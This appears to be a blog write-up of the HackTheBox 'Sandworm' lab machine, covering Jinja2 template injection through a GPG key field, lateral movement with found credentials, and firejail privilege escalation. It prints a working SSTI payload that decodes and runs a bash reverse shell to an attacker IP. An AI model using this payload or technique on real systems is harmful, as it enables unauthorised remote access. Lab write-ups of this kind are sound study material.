---
layout: post
title: "HTB Linux Medium: Sandworm"
description: "Sandworm is a Medium rated Linux machine on HTB."
categories: [CTF,HTB]
tags: [Linux,Medium]
author: g
---


## Nmap
![Pasted image 20240714210737.png](/images/Pasted image 20240714210737.png){: .normal }

Modify the hosts file, add the `ssa.htb` domain:
![Pasted image 20240714210717.png](/images/Pasted image 20240714210717.png){: .normal width="500"}


## _**Initial Foothold**_

### Enumerating HTTP (Port 443)
Run Gobuster for directory enumeration (use -k flag to disable certificates).
![Pasted image 20240714210712.png](/images/Pasted image 20240714210712.png){: .normal }

The page found on /guide lets us verify signatures. We can test SSTI in here.
![Pasted image 20240714210708.png](/images/Pasted image 20240714210708.png){: .normal }

Start off by generating a gpg key, set your payload in the "Real name" field.
![Pasted image 20240714210703.png](/images/Pasted image 20240714210703.png){: .normal }

Next up, we can print our public gpg key (which is used on the website).
![Pasted image 20240714210656.png](/images/Pasted image 20240714210656.png){: .normal width="500" }

Now we can create signed text that we will decrypt on the website (which will execute our SSTI).
![Pasted image 20240714210649.png](/images/Pasted image 20240714210649.png){: .normal width="500" }

Next, enter your public key and signed message on the website and press "Verify Signature".
![Pasted image 20240714210638.png](/images/Pasted image 20240714210638.png){: .normal width="460"}

As you can see our SSTI was successful as it displays 49 instead of {% raw %}`{{7x7}}`{% endraw %}, since we know we have SSTI on the box we can use it to establish a reverse shell using the following payload.
![Pasted image 20240714210629.png](/images/Pasted image 20240714210629.png){: .normal }
{% raw %}
```bash
{{self.__init__.__globals__.__builtins__.__import__('os').popen('echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yNTUvMTIzNCAwPiYxJwo= | base64 -d | bash').read() }}
```
{% endraw %}

Repeat the same steps as before (now entering our payload in the Real Name field) to establish a reverse shell.
![Pasted image 20240714210622.png](/images/Pasted image 20240714210622.png){: .normal width="600" }


## _**Lateral Movement**_
User credentials can be found for the silentobserver user in the following file `silentobserver:quietLiketheWind22`.
![Pasted image 20240714210618.png](/images/Pasted image 20240714210618.png){: .normal }

SSH into the box as the silentobserver user.
![Pasted image 20240714210612.png](/images/Pasted image 20240714210612.png){: .normal }

Checking for running processes we find that the atlas user is running target/debug/tipnet.
![Pasted image 20240714210609.png](/images/Pasted image 20240714210609.png){: .normal width="700" }

Looking at the files in the debug folder we see the following.
![Pasted image 20240714210604.png](/images/Pasted image 20240714210604.png){: .normal width="600" }

In the tipnet.d file we can see files that are being ran.
![Pasted image 20240714210557.png](/images/Pasted image 20240714210557.png){: .normal }

The second one seems to have write permissions (we can put a reverse shell in here).
![Pasted image 20240714210552.png](/images/Pasted image 20240714210552.png){: .normal }

Payload.
![Pasted image 20240714210546.png](/images/Pasted image 20240714210546.png){: .normal }


## _**Priv Esc**_
Sticky bit on firejail found using Linpeas.
![Pasted image 20240714210541.png](/images/Pasted image 20240714210541.png){: .normal }


Googling for a firejail SUID exploit we find a Python script that we can run.
![Pasted image 20240714210536.png](/images/Pasted image 20240714210536.png){: .normal }

In another instance, we can join the firejail and change our user to root.
![Pasted image 20240714210525.png](/images/Pasted image 20240714210525.png){: .normal width="450"}


## User.txt
![Pasted image 20240714210511.png](/images/Pasted image 20240714210511.png){: .normal width="400"}


## Root.txt
![Pasted image 20240714210505.png](/images/Pasted image 20240714210505.png){: .normal width="400"}


## You have PWNED
![Pasted image 20240714210500.png](/images/Pasted image 20240714210500.png){: .normal }


### Sources
- [SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
- [Reverse Shell](https://exploit-notes.hdks.org/exploit/web/framework/python/flask-jinja2-pentesting/)
- [Firejail exploit](https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25)